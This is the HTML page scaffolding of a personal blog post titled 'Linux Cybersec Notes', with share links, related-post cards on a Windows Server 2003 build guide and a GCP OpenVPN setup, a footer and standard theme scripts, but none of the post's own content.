href="https://www.facebook.com/sharer/sharer.php?title=Linux Cybersec Notes - Wrathdemon&u=https://www.cyberblog.ml/posts/Linux-Cybersec-Notes/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Linux Cybersec Notes - Wrathdemon&url=https://www.cyberblog.ml/posts/Linux-Cybersec-Notes/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Windows-server-2003/">Windows Server 2003 (NT 5.2 / 3790) guide</a><li><a href="/posts/Linux-Cybersec-Notes/">Linux Cybersec Notes</a><li><a href="/posts/Setup-Openvpn-on-GCP/">Create Your own private VPN using GCP instance</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writing/">writing</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Windows-server-2003/"><div class="card-body"> <em class="timeago small" date="2022-01-07 00:10:00 +0530" >Jan 7</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Server 2003 (NT 5.2 / 3790) guide</h3><div class="text-muted small"><p> Windows Server 2003 (NT 5.2 / 3790) guide Preparing Environment Extract source tree, in this guide we will assume C:\NT (if you wish for your binaries to match RTM as closely as possible, use...</p></div></div></a></div><div class="card"> <a href="/posts/Setup-Openvpn-on-GCP/"><div class="card-body"> <em class="timeago small" date="2022-02-18 17:30:00 +0530" >Feb 18</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Create Your own private VPN using GCP instance</h3><div class="text-muted small"><p> Setup a GCP cloud Instance Create a GCP cloud instance and open your preferred port by going into the firewall and setting up the Inbound rules for that port. The preferred port is UDP port 1...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Windows-server-2003/" class="btn btn-outline-primary" prompt="Older"><p>Windows Server 2003 (NT 5.2 / 3790) guide</p></a> <a href="/posts/Setup-Openvpn-on-GCP/" class="btn btn-outline-primary" prompt="Newer"><p>Create Your own private VPN using GCP instance</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/joshi_prabhat_">Wrathdemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writing/">writing</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
